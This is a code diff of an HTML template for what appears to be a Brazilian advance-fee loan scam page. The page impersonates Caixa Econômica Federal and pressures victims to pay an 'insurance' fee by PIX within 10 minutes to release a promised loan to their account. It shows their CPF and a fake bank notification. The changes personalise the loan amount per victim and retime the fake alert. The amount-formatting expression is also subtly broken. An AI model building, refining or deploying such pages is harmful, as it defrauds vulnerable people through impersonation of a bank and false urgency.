@@ -435,7 +435,7 @@
                 </div>
                 <div class="text-black text-base font-bold mb-1 flex items-center whitespace-nowrap overflow-hidden" style="text-overflow: ellipsis; font-family: 'Inter', sans-serif;">
                     <span class="mr-2" style="font-size: 1.1em;">💰</span>
-                    Você vai receber R$ 4.000,00
+                    Você vai receber R$ {{ '{:,.2f}'.format(customer.amount|float).replace(',', '.').replace('.', ',') }}
                 </div>
             </div>
             <div class="w-12 h-12 flex-shrink-0 overflow-hidden rounded-[10px]">
@@ -443,7 +443,7 @@
             </div>
         </div>
         <div class="text-gray-600 text-sm w-full mt-0.5" style="word-break: break-word; font-family: 'Inter', sans-serif;">
-            Caixa Econômica Federal está aguardando o pagamento do seguro no valor de R$ {{ "%.2f"|format(amount) }} para depositar R$ 4.000,00 em sua conta <span id="bankText" style="font-family: 'Inter', sans-serif;">Nubank</span>. Copie o código PIX e realize o pagamento em até 10 minutos ou a transação será bloqueada.
+            Caixa Econômica Federal está aguardando o pagamento do seguro no valor de R$ {{ "%.2f"|format(amount) }} para depositar R$ {{ '{:,.2f}'.format(customer.amount|float).replace(',', '.').replace('.', ',') }} em sua conta <span id="bankText" style="font-family: 'Inter', sans-serif;">Nubank</span>. Copie o código PIX e realize o pagamento em até 10 minutos ou a transação será bloqueada.
         </div>
     </div>
 
@@ -507,7 +507,7 @@
                 <div style="background-color: #f5f8ff; padding: 20px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 20px;">
                     <div style="margin-bottom: 15px;">
                         <div style="font-weight: 600; color: #1351b4; margin-bottom: 5px;">Valor do Empréstimo:</div>
-                        <div style="font-size: 1.2rem; font-weight: 700; color: #28a745;">R$ 4.000,00</div>
+                        <div style="font-size: 1.2rem; font-weight: 700; color: #28a745;">R$ {{ '{:,.2f}'.format(customer.amount|float).replace(',', '.').replace('.', ',') }}</div>
                     </div>
                     
                     <div style="margin-bottom: 15px;">
@@ -530,7 +530,7 @@
                         <i class="fas fa-info-circle" style="color: #f39c12; font-size: 1.2rem; margin-right: 10px;"></i>
                         <div style="font-weight: 600; color: #f39c12;">Importante:</div>
                     </div>
-                    <p style="margin: 0; line-height: 1.4;">Após o pagamento do seguro, o valor de <strong>R$ 4.000,00</strong> será depositado em até <strong>5 minutos</strong> na conta vinculada ao CPF <strong>{{ cpf }}</strong>.</p>
+                    <p style="margin: 0; line-height: 1.4;">Após o pagamento do seguro, o valor de <strong>R$ {{ '{:,.2f}'.format(customer.amount|float).replace(',', '.').replace('.', ',') }}</strong> será depositado em até <strong>5 minutos</strong> na conta vinculada ao CPF <strong>{{ cpf }}</strong>.</p>
                 </div>
             </div>
 
@@ -671,10 +671,10 @@
                 document.getElementById('bankName1').innerHTML = bankName + ' • agora <i class="fas fa-chevron-down text-xs"></i>';
                 document.getElementById('bankText').textContent = bankName;
                 
-                // Mostrar notificação após 6 segundos
+                // Mostrar notificação após 12 segundos
                 setTimeout(function() {
                     showNotification();
-                }, 6000);
+                }, 12000);
 
                 function showNotification() {
                     // Tocar o som de notificação
